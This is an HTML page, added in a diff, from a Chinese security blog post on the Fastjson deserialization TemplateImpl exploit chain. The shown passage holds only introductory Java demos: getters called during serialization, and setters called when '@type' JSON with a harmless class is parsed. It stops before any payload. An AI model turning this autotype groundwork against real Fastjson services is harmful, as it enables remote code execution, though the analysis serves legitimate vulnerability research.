@@ -1,0 +1,1145 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+  <meta http-equiv="Pragma" content="no-cache">
+  <meta http-equiv="Expires" content="0">
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/dayu/dayu-apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/dayu/dayu-web-app-manifest-512x512.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/dayu/dayu-web-app-manifest-192x192.png">
+  <link rel="mask-icon" href="/images/dayu/dayu-favicon.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"dayutech.github.io","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"gitalk","storage":true,"lazyload":false,"nav":null,"activeClass":"gitalk"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":5,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="@TOC 我们知道Fastjson在进行序列化的时候会调用当前类的所有getter方法去获取所有public成员变量的值，像这样： 123456789101112131415161718package com.armandhe.javabase;import com.alibaba.fastjson.JSON;import com.alibaba.fastjson.JSONObject;impor">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Fastjson反序列化漏洞TemplateImpl利用链条跟踪与分析">
+<meta property="og:url" content="https://dayutech.github.io/archives/4187a059.html">
+<meta property="og:site_name" content="Dayu Technology Co., LTD">
+<meta property="og:description" content="@TOC 我们知道Fastjson在进行序列化的时候会调用当前类的所有getter方法去获取所有public成员变量的值，像这样： 123456789101112131415161718package com.armandhe.javabase;import com.alibaba.fastjson.JSON;import com.alibaba.fastjson.JSONObject;impor">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/1db44ff51eb95e9d8a305037594671d8.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/6ae3d41db6032e545a2d41f6cd3306b8.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/0f871300306c9def040ce2a9d60ff77f.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/e64c07bafaec2456193b65a3a30b034c.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/c9ad0b9063671b41ca96d2601723db5f.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/20b1cb2630c86569dddb4d26e33d4c6b.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/0a7c061ea34cc5dfacff44acb6d61e51.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/47ddde20e74f4158fc36b2fc5714a65a.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/102d2742a5cb87d304247b8fe38b58db.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/f7a1b4cb0394e0312665e69c8aa17559.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/a940036dea76980597a5d109b591486b.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/18825b7b412709fa4a714e7676637a18.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/dee7b98cf6f97d60ac4fd613d2dddfcd.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/e7d839663b4709b41f3c71a44141481c.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/4eeedc02d3106571d951b121eef661da.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/37cde3d936f2a5017a4c3d0c9a1b4f26.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/2506c24576472c96e0251e20ebe6eb1e.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/f063a10dc4a3a989c771b7202d472fe8.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/21be525054f6eacbb38b83131c73b952.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/679d84dab4f64ffc90b42c06ba0f635b.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/a08f58da592247915b64ee616dfc21e6.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/e464c93696f3b3b0857384cd5d1f3be5.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/a4c70ef479481c8497a1ad8c5093c84c.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/97befd5b67a280e376c3346558e06c0c.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/4fb8bbf9a4cbf45602511d6cfac43106.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/f42e03f693cc4efbfc16f5b6fb6bdd48.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/afe015a247f576402a14867fe2a58e19.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/7e721ed2548ac42df0d2e96570444dfd.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/ecb5ba3b4262d1036a53ec92d6d5357f.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/c80db5f1bc10df5d5d7b112bb9ab0636.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/6b132329d9a05c2df08cc4e075cc9b67.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/3d5c85e5f6fbb39267499e1d386e64da.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/419ec316e45994ee75282e83ef275758.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/23da7cbb241829c5c2aaca5ca2465275.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/1e01dda8b1c061a4fce244eaab0bb788.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/13c3654464cee3c403c0a1227a229ffe.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/9f73cac0c741f9b7a555c7727aa9890f.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/54fc5f878379efa07b945d4ab82e8366.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/c6b127bec0b43f2432ab9716db80349a.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/0b6053e5d2e6ba965c51337978ba4982.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/dfc7531499a7428d38c9c68857ed7f7d.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/b72d99e660b80bcfe797a6e6b73468cc.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/62a76338ff33d2d8182905a2475a49ce.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/d1342d5949c6380b5bfdc33abfabcb23.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/84d5091d7fb87ddd235d21d8ee9fa7b2.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/3a3a70dd76788ffe1f9496e814d1c5da.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/5a3b8cb3c6aadb5a6cccbff31a0be4e9.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/6e91952f5d4c63dcada2109957040447.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/50f3c6e52debaacd230984e5f166a384.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/16fef496cf1fc4b119efb2eb7b3b668a.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/7f7989d251cb1a7d61acc64a89fa6735.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/7b646c4806f06aad7cfadc5270791a03.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/ec5fcba7df48c9af84f46331892f8dc4.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/dca9c0ffd21e2e2c7835c0d0c2cb313d.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/ae9ee75446203cd8576d24a42b85704e.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/a0d24d9b5d3bf931ef0b112c6bce3570.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/822d25190bc4b113d757a827db2f4e4b.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/d3215dd01bbd53746fc3e26adf1b66cd.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/da541b6fc0351c2fccfda9e480cb0b7d.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/74de1d2ca82ad454088850b963d7ff36.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/a35f9036a8fd9caeeb4c5e8b3f1d88cd.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/432d562f7dec5775315372382631e7fc.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/930a4b463d3a7cd04ca8c2fc6c8a8d58.png">
+<meta property="article:published_time" content="2025-04-14T02:33:52.000Z">
+<meta property="article:modified_time" content="2025-07-29T09:02:06.727Z">
+<meta property="article:author" content="Arliya">
+<meta property="article:tag" content="反序列化">
+<meta property="article:tag" content="fastjson">
+<meta property="article:tag" content="gadgets">
+<meta property="article:tag" content="templateImpl">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i-blog.csdnimg.cn/blog_migrate/1db44ff51eb95e9d8a305037594671d8.png">
+
+<link rel="canonical" href="https://dayutech.github.io/archives/4187a059.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/theme-next/theme-next-needmoreshare2@1/needsharebutton.min.css"><style>
+#needsharebutton-postbottom {
+  cursor: pointer;
+  height: 26px;
+  margin-top: 10px;
+  position: relative;
+}
+#needsharebutton-postbottom .btn {
+  border: 1px solid $btn-default-border-color;
+  border-radius: 3px;
+  display: initial;
+  padding: 1px 4px;
+}
+</style><style>
+#needsharebutton-float {
+  bottom: 88px;
+  cursor: pointer;
+  left: -8px;
+  position: fixed;
+  z-index: 9999;
+}
+#needsharebutton-float .btn {
+  border: 1px solid $btn-default-border-color;
+  border-radius: 4px;
+  padding: 0 10px 0 14px;
+}
+</style>
+  <title>Fastjson反序列化漏洞TemplateImpl利用链条跟踪与分析 | Dayu Technology Co., LTD</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="Dayu Technology Co., LTD" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Dayu Technology Co., LTD</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">大禹科技股份有限公司</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-rss">
+
+    <a href="/atom.xml" rel="section"><i class="fa fa-rss fa-fw"></i>RSS</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <a href="https://github.com/dayutech/dayutech.github.io" class="github-corner" title="Dayu GitHub" aria-label="Dayu GitHub" rel="noopener external nofollow noreferrer" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://dayutech.github.io/archives/4187a059.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/dayu/avatar.png">
+      <meta itemprop="name" content="Arliya">
+      <meta itemprop="description" content="主要从事Web漏洞挖掘工作，涉猎编程语言包括Java、Scala、C/C++、PHP、Python、C#、Golang，涉及领域包括Web以及二进制漏洞挖掘，二进制比较菜，平时喜欢在金融市场消费">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Dayu Technology Co., LTD">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Fastjson反序列化漏洞TemplateImpl利用链条跟踪与分析
+        </h1>
+
+        <div class="post-meta">
+		  
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2025-04-14 10:33:52" itemprop="dateCreated datePublished" datetime="2025-04-14T10:33:52+08:00">2025-04-14</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-07-29 17:02:06" itemprop="dateModified" datetime="2025-07-29T17:02:06+08:00">2025-07-29</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" itemprop="url" rel="index"><span itemprop="name">漏洞分析</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>3.7k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>13 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>@<a href="Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9ETemplateImpl%E5%88%A9%E7%94%A8%E9%93%BE%E6%9D%A1%E8%B7%9F%E8%B8%AA%E4%B8%8E%E5%88%86%E6%9E%90">TOC</a></p>
+<p>我们知道Fastjson在进行序列化的时候会调用当前类的所有getter方法去获取所有public成员变量的值，像这样：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.armandhe.javabase;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FastjsonTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">FastjsonUnserilizeTest</span> <span class="variable">fastjsonUnserilizeTest</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FastjsonUnserilizeTest</span>();</span><br><span class="line"><span class="comment">//        fastjsonUnserilizeTest.setAge(20);</span></span><br><span class="line"><span class="comment">//        fastjsonUnserilizeTest.setName(&quot;armandhenewpy&quot;);</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> JSON.toJSONString(fastjsonUnserilizeTest, SerializerFeature.WriteClassName);</span><br><span class="line">        System.out.println(s);</span><br><span class="line"><span class="comment">//        String s1 = &quot;&#123;\&quot;@type\&quot;:\&quot;com.armandhe.javabase.FastjsonUnserilizeTest\&quot;,\&quot;age\&quot;:20,\&quot;name\&quot;:\&quot;armandhenewpy\&quot;&#125;&quot;;</span></span><br><span class="line"><span class="comment">//        JSONObject jsonObject = JSON.parseObject(s1);</span></span><br><span class="line"><span class="comment">//        System.out.println(jsonObject);</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<span id="more"></span>
+<p>上面代码对FastjsonUnserilizeTest类的一个对象进行了序列化，这将会调用FastjsonUnserilizeTest中的所有getter。最终的结果为：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/1db44ff51eb95e9d8a305037594671d8.png" alt="在这里插入图片描述"><br>可以看到调用了getter，我们FastjsonUnserilizeTest类的代码是这样写的：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.armandhe.javabase;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FastjsonUnserilizeTest</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了getname方法！&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了setname方法！&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了getage方法！&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了setage方法！&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>可以看到age的初始值为0，符合我们的输出。<br>我们在看下面的代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.armandhe.javabase;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FastjsonTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">FastjsonUnserilizeTest</span> <span class="variable">fastjsonUnserilizeTest</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FastjsonUnserilizeTest</span>();</span><br><span class="line"><span class="comment">//        fastjsonUnserilizeTest.setAge(20);</span></span><br><span class="line"><span class="comment">//        fastjsonUnserilizeTest.setName(&quot;armandhenewpy&quot;);</span></span><br><span class="line"><span class="comment">//        String s = JSON.toJSONString(fastjsonUnserilizeTest, SerializerFeature.WriteClassName);</span></span><br><span class="line"><span class="comment">//        System.out.println(s);</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">s1</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.armandhe.javabase.FastjsonUnserilizeTest\&quot;,\&quot;age\&quot;:20,\&quot;name\&quot;:\&quot;armandhenewpy\&quot;&#125;&quot;</span>;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">parse</span> <span class="operator">=</span> JSON.parse(s1);</span><br><span class="line">        System.out.println(parse);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这时候的输出为：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/6ae3d41db6032e545a2d41f6cd3306b8.png" alt="在这里插入图片描述"><br>看到反序列化的时候只调用了所有setter，我们将代码变化一下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.armandhe.javabase;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FastjsonTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">FastjsonUnserilizeTest</span> <span class="variable">fastjsonUnserilizeTest</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FastjsonUnserilizeTest</span>();</span><br><span class="line"><span class="comment">//        fastjsonUnserilizeTest.setAge(20);</span></span><br><span class="line"><span class="comment">//        fastjsonUnserilizeTest.setName(&quot;armandhenewpy&quot;);</span></span><br><span class="line"><span class="comment">//        String s = JSON.toJSONString(fastjsonUnserilizeTest, SerializerFeature.WriteClassName);</span></span><br><span class="line"><span class="comment">//        System.out.println(s);</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">s1</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.armandhe.javabase.FastjsonUnserilizeTest\&quot;,\&quot;age\&quot;:20,\&quot;name\&quot;:\&quot;armandhenewpy\&quot;&#125;&quot;</span>;</span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">jsonObject</span> <span class="operator">=</span> JSON.parseObject(s1);</span><br><span class="line">        System.out.println(jsonObject);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
